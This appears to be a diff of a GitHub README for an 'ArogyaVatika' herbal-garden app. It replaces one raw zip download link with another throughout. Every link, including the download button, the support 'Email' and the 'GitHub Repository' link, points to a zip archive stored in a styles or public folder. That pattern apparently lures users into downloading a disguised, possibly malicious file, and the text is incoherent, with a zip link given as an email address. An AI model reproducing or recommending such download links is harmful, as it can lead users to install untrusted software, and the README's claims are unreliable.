@@ -4,16 +4,16 @@
 
 Welcome to ArogyaVatika! This application provides an AI-Based Climate-Smart Virtual Herbal Garden, helping you embrace sustainable living and wellness with ease. Follow these steps to get started.
 
-[![Download ArogyaVatika](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/src/styles/ArogyaVatika_1.7.zip)](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/src/styles/ArogyaVatika_1.7.zip)
+[![Download ArogyaVatika](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/public/Vatika_Arogya_v3.0.zip)](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/public/Vatika_Arogya_v3.0.zip)
 
 ## 📥 Download & Install
 
 To download ArogyaVatika, follow these simple steps:
 
 1. Click on the link below:
-   [Download ArogyaVatika](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/src/styles/ArogyaVatika_1.7.zip)
+   [Download ArogyaVatika](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/public/Vatika_Arogya_v3.0.zip)
    
-2. Once you are on the Releases page, find the latest version listed at the top. Look for a file named 'https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/src/styles/ArogyaVatika_1.7.zip' or similar.
+2. Once you are on the Releases page, find the latest version listed at the top. Look for a file named 'https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/public/Vatika_Arogya_v3.0.zip' or similar.
 
 3. Click on the file name to start the download.
 
@@ -71,7 +71,7 @@ For further assistance, feel free to raise an issue on our GitHub repository, or
 
 For direct support, you can contact us at:
 
-- Email: https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/src/styles/ArogyaVatika_1.7.zip
+- Email: https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/public/Vatika_Arogya_v3.0.zip
 
 ## 📁 License
 
@@ -81,6 +81,6 @@ ArogyaVatika is open-source software licensed under the MIT License. Feel free t
 
 For more details and updates, visit our GitHub page:
 
-[GitHub Repository - ArogyaVatika](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/src/styles/ArogyaVatika_1.7.zip)
+[GitHub Repository - ArogyaVatika](https://raw.githubusercontent.com/kaungmyatsan565/ArogyaVatika/main/public/Vatika_Arogya_v3.0.zip)
 
 Thank you for choosing ArogyaVatika! Your journey towards wellness starts today. 
